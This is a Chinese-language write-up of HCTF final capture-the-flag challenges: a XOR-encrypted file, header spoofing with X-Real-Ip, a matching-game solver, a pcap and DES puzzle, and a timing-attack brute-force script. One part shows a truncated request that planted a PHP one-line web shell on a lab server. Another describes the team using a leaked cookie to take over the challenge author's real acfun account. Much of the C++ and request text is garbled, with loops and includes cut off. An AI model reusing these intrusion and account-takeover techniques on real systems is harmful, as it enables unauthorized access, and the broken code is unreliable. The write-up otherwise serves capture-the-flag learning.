    0000040: abfc adcc bda1 f921 1f41 aaa1 a29f a166  .......!.A.....f
    0000050: 8a2d 229e c161 d663 9f8f 6e28 3b34 96e5  .-"..a.c..n(;4..
    0000060: e06a 972b 9561 956b 959d 95d2 2817 da28  .j.+.a.k....(..(
    0000070: 7582 cbd2 9521 9589 956b 9525 9595 956b  u....!...k.%...k
    0000080: 9521 956b 954b 9595 956b 956b 9589 fa03  .!.k.K...k.k....
    0000090: fae5 e026 9b6b 956b 9522 9596 9559 9521  ...&.k.k."...Y.!
    00000a0: 9534 956b 9595                           .4.k..
“`
偶数位置上及以5结尾的位置上的解密方式是`+=
flag[16]`，否则的话，[有情怀的位置](http://www.zhihu.com/question/26292516)上解密方式是`-=
flag[17]`，其他位置上为`^= flag[16]`。
注意到现在数据中有许多连续的0x95中间夹杂0x6B，我们可以做出一个合理的假设：这一段在加密前的数据中是连续的相同字符，利用这一点和加密方式的不同，可以得到
“` python
    >>> for o in xrange(256):
    ...     for b in xrange(256):
    ...             if 0x6b ^ b == o and ((0x95+b)&255) == o:
    ...                     print o,b
    ...
    0 107
    4 111
    16 123
    20 127
    128 235
    132 239
    144 251
    148 255
“`
x7f不太可能是flag中的字符，而4和16作为出现频率最高的字符则不太合理，因此我们得到flag[16] == chr(107) == 'k'
而flag[17]的范围十分有限，暴力之，将输出的文件交给`file`：
“`
r_____@NyanL:~/ctf/hctf-final$ file bin*
bin_21.zip: Zip archive data, at least v1.0 to extract
bin_22.zip: data
bin_23.zip: data
bin_24.zip: data
bin_25.zip: data
bin_26.zip: data
bin_27.zip: data
bin_28.zip: data
bin_29.zip: data
bin_2A.zip: data
bin_2B.zip: data
bin_2C.zip: data
bin_2D.zip: data
bin_2E.zip: data
bin_2F.zip: data
“`
只有0x21有意义。
于是我们得到了flag内容为为`hctf{??a_y*c7%etk!}`，`??`为不能确定的部分，不过由flag中一共有3位数字，可以知道这两位一定是数字，一共只有100种可能，直接暴力提交：
“`python
    #!/usr/bin/python
    import requests
    import bot
    flag = 'hctf{??a_y*c7%etk!}'
    for i in xrange(100):
            tf = flag.replace('??','%02d' % i)
            print 'Try ', tf, '....'
            if bot.submit_flag(tf):
                    print 'nm is %02d' % i
                    break
“`
（我没记错的话最终flag里的`??`部分是13）
第二个route的第二题，一个考察HTTP header的web题。
队友对其的描述是：“鬼知道是啥的web”，简直233
访问一下提示什么不能从remote host access，于是X-Forwarded-For，X-Real-Ip，Client-Ip挨个砸上去，提交X-Real-Ip: 127.0.0.1的时候莫名其妙返回了一个flag。
（第一天还交不了，第二天就能交了，不知道为什么。）
第三个route的第一题是个驱动题，觉得会蛋疼直接没看，第三个route的第二题是个web，当时我没搞定。赛后问了一下据说是个post注入，直接sqlmap就可以orz。
第四个route的第一题是个连连看，需要写代码解决。
人  
肉交互一小会儿可以大概猜出这是一个连连看，人肉玩过之后可以发现是正常规则的连连看，考虑每次把能消的消一步，消不动的情况和正常的连连看一样会自行  
reshuffle，不需要一次消干净（事实上服务器经常会生成出不存在能不reshuffle就一口气消完的解的局面）。
交互脚本
“` python
    #!/usr/bin/python
    from zio import *
    import os,sys
    io = zio(('10.11.12.13',6666), timeout=100000)
    while True:
            io.read_until('ROUND ')
            io.readline()
            print 'New round..'
            while True:
                    state = ''
                    rows = 0
                    cols = 0
                    win = False
                    while True:
                            t = io.readline()
                            if t.find('INPUT') != -1: break
                            if t.find('WIN') != -1:
                                    win = True
                                    break
                            state += t
                            cols = len(t.split('t'))
                            rows += 1
                    if win:
                            print 'WON!'
                            break
                    print 'We have a %d x %d puzzle.' % (rows,cols)
                    state = '%d %dn' % (rows, cols) + state
                    with open('link.in','wt') as fp:
                            fp.write(state)
                    print repr(state)
                    print 'Running solver...'
                    os.system('./link_solver  link.out')
                    with open('link.out','rt') as fp:
                            moves = fp.read().strip().split('n')
                    fst = True
                    for x in moves:
                            if not fst:
                                    io.read_until('INPUT')
                                    io.readline()
                            fst = False
                            io.writeline(x)
“`
这个Solver写麻烦了，不需要dfs的，一开始以为需要一组能一口气彻底消完的解于是写成了这样，后来也没改，就直接把dfs废掉完事…
“` c++
    #include 
    using namespace std;
    typedef long long ll;
    typedef pair pii;
    typedef pair piiii;
    #define encode(x,y,d,t) ((x) * 24 * 24 * 24 + (y) * 24 * 24 + (d) * 24 + (t))
    int mat[111][111];
    vector solution;
    vector cur_sol;
    int n = 0;
    int m = 0;
    const int dx[] = {0,0,1,-1};
    const int dy[] = {1,-1,0,0};
    bool vis[44][44][5][4];
    bool have_route(int x1,int y1,int x2,int y2)
    {
            if(x1 == x2 && y1 == y2) return false;
            memset(vis,0,sizeof(vis));
            queue q;
            q.push(encode(x1,y1,4,0));
            vis[x1][y1][4][0] = true;
            while(!q.empty())
            {
                    int state = q.front(); q.pop();
                    int t = state % 24; state /= 24;
                    int d = state % 24; state /= 24;
                    int y = state % 24; state /= 24;
                    int x = state % 24;
                    for(int i = 0;i  n+1 || ny  m+1) continue;
                            int nt = t + (d != i);
                            if(d == 4) nt = t;
                            if(nt > 2) continue;
                            if(nx == x2 && ny == y2)
                            {
                                    return true;
                            }
                            if(!vis[nx][ny][i][nt] && mat[nx][ny] == 0)
                            {
                                    vis[nx][ny][i][nt] = true;
                                    q.push(encode(nx,ny,i,nt));
                                    //printf("%d %d %d %d -> %d %d %d %dn",x,y,d,t,nx,ny,i,nt);
                            }
                    }
            }
            return false;
    }
    int dfs(int depth)
    {
            if(depth == /*n * m / 2*/1) { solution = cur_sol; return 1; }
            for(int x1 = 1;x1 helloworld/adog.php`'1_11_aa/.php  
HTTP/1.1
Host: 10.12.13.89
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent:  
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36  
(KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4
Cookie: PHPSESSID=l37h70e8t813r6qbprgp0kfn27
（robots.txt中有提示helloworld这个权限为777的目录）
于是在网站根目录的helloworld文件夹中写入了一句话木马，接着连上去，在网站根目录和数据库分别发现一枚flag：
顺便附上这道题目作者的blog（http://www.nohackair.net/176.shit），我的做法和他预设的做法不一样，他原来预设的做法显然更加高大上一些～
接下来是route5的第一题，是个pcap流量分析。
大  
家首先一通乱搞，把题目作者的acfun账号拿了下来（显然作者不小心留了未过期的cookie在里面），胡乱翻了一通没发现什么信息，于是继续看。使用  
filter为tcp contains “.rar”搜出一条奇怪流量，把rar还原出来。里面有一个图片和一个doc文件，图片如下：
上面有信息key：XPA087T24433PASS
但用这个怎么提交都不对，图片也分析不出什么。后来主办方放出hint，说doc后面有密文。
于  
是ultraedit打开doc，对比着正常的doc文件把末尾的密文扒拉出来，因为key是16位长的字符串，也就是128bit，猜测可能是AES等  
用128bit密钥的加密算法。搞了半天没结果，后来主办有提示这是DES加密，可DES如何使用128bit的密钥，你在逗我？
结果在胡搞的过程中随手尝试了用XPA087T2当作密钥来解密密文，把解密出的东西print出来一看，PDF magic header！看来就是他了。
然后看PDF，怎么也找不出东西，随手command＋F搜索，结果如下：
显然主办方藏了base64，复制出来解密，得到flag，First blood。
第五个route的第二题，web小trick集锦，首先wget首页，然后xdd看一下，发现tab和空格有猫腻。
然后用python胡搞一下：
接下来去下载nizaizhaoshenme，发现是个png图片，丢给[http://utilitymill.com/utility/Steganography_Decode](http://utilitymill.com/utility/Steganography_Decode)，可以获得flag，或者本地用stepic也可以。
接  
下来会发现一个网站，登录之后可以执行命令，但是个硬编码的，各种fuzz无果，后来发现页面注释有提示flag.php?ue=flag，而  
flag.php的内容是个unixtime，这次比赛的flag都是hctf{开头的，于是测试flag.php?ue=hctf{，页面产生明显延  
迟，于是猜测是时序攻击，附上脚本。
    import string
    import time
    import requests
    ans = 'hctf{9(xD@i}'
    # buf = string.ascii_letters + string.digits
    # buf = string.ascii_letters + string.digits
    for i in xrange(20):
        # for tmp in range(33,127):
        for tmp in range(ord('1'),127):
            tmp = chr(tmp)
            a = time.time()
            r = requests.get('http://10.12.14.51/24lejfo9aldk/flag.php?ue=' + ans + tmp)
            b = time.time()
            print '----'
            print 'Testing: ' + tmp
            print '----'
            if b - a - len(ans) > 1.0:
                ans += tmp
                print 'Found!'
                print 'Now the flag is: ' + ans
                break
            else:
                print 'Failed at ' + tmp + '...'
                print 'Now the flag is: ' + ans
                continue
    # a = time.time()
    # r = requests.get('http://10.12.14.51/24lejfo9aldk/flag.php?ue=')
    # b = time.time()
    # print b-a
最后拿下flag，接下来是个安卓kernel的题目，时间也不够了，于是就放弃咯。
欢迎交流扯淡：
weibo：weibo.com/d34dc47
blog：gou.gg
email：deadcat6464[at]gmail.com
其他wirteup：[HCTF-Writeup-by-Pax.Mac-Team](http://conqu3r.paxmac.org/wp-content/uploads/HCTF-Writeup-by-Pax.Mac-Team%E5%9B%A2%E9%98%9F.pdf)